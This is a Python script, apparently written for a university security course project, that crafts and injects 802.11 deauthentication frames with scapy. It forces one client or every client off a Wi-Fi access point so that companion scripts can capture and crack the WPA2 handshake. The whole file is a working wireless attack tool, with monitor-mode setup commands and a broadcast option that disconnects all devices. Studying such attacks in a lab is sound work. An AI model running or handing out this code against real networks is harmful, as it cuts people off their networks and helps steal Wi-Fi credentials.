#!/usr/bin/env python3
"""
deauth.py  --  CSE 406 Project (Topic 20)

Sends 802.11 deauthentication frames to force a connected client off an
access point. When the client reconnects it performs the WPA2 4-way
handshake again -- which capture.py records so crack.py can attack it.

We CRAFT THE FRAME OURSELVES with scapy (RadioTap / Dot11 / Dot11Deauth).
We do NOT call aireplay-ng. This is the "craft your own frame" deliverable.

Prep (once, in another pane), to put the NIC in monitor mode on the AP channel:
    sudo ip link set wlan0 down
    sudo iw wlan0 set monitor control
    sudo ip link set wlan0 up
    sudo iw wlan0 set channel 6

Run:
    sudo python3 deauth.py

INTERFACE/AP_MAC come from config.py. CLIENT_MAC is OPTIONAL:
  - Leave it empty (default) to broadcast a deauth to EVERY client on the AP
    (dst = ff:ff:ff:ff:ff:ff). This knocks off any/all associated devices.
  - Set it to one client's MAC to target only that device (a cleaner, more
    reliable single-client kick, and quieter on the air).
"""

from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import time

import config

BROADCAST = "ff:ff:ff:ff:ff:ff"

# ---- target configuration (CLIENT_MAC in config.py is optional) --------
INTERFACE = config.MONITOR_INTERFACE
AP_MAC    = config.BSSID            # BSSID of target AP
CLIENT    = config.CLIENT_MAC       # optional; empty => broadcast to all clients
COUNT     = 10                      # how many deauth bursts to send
REASON    = 7                       # 802.11 reason code 7 = class-3 frame from
                                    #   nonassociated STA (a common deauth reason)
# -----------------------------------------------------------------------


def build_deauth(dst, src, bssid):
    """Return ONE 802.11 deauth frame addressed dst<-src inside BSS 'bssid'."""
    # RadioTap()          : the radio header the driver needs to inject a frame
    # Dot11(...)          : the 802.11 MAC header
    #     type=0 subtype=12 -> management frame, subtype 12 = deauthentication
    #     addr1 = receiver (DA), addr2 = transmitter (SA), addr3 = BSSID
    # Dot11Deauth(reason) : the deauth body carrying the reason code
    # The '/' operator in scapy stacks one layer on top of the next.
    return (RadioTap() /
            Dot11(type=0, subtype=12, addr1=dst, addr2=src, addr3=bssid) /
            Dot11Deauth(reason=REASON))


def main():
    if CLIENT:
        # Targeted mode: two frames per burst for a specific client.
        target = CLIENT
        # Frame A: tell the CLIENT it is deauthenticated from the AP
        to_client = build_deauth(dst=CLIENT, src=AP_MAC, bssid=AP_MAC)
        # Frame B: tell the AP that the CLIENT has left (helps trigger re-handshake)
        to_ap = build_deauth(dst=AP_MAC, src=CLIENT, bssid=AP_MAC)
        frames = [to_client, to_ap]
    else:
        # Broadcast mode: one frame from the AP to every client at once.
        target = BROADCAST
        frames = [build_deauth(dst=BROADCAST, src=AP_MAC, bssid=AP_MAC)]

    who = "ALL clients (broadcast)" if not CLIENT else target
    print(f"[*] Deauthing {who} from {AP_MAC} on {INTERFACE} ({COUNT} bursts)")

    for i in range(COUNT):                 # range(COUNT) = 0,1,...,COUNT-1
        for frame in frames:
            # sendp() transmits at layer 2 (raw frames) out the given interface.
            sendp(frame, iface=INTERFACE, count=1, verbose=False)
        print(f"    burst {i + 1}/{COUNT} sent")
        time.sleep(0.1)                    # 100 ms between bursts

    print("[+] Done. Watch capture.py for the handshake.")


if __name__ == "__main__":                 # run main() only when executed
    main()                                 # directly (not when imported)
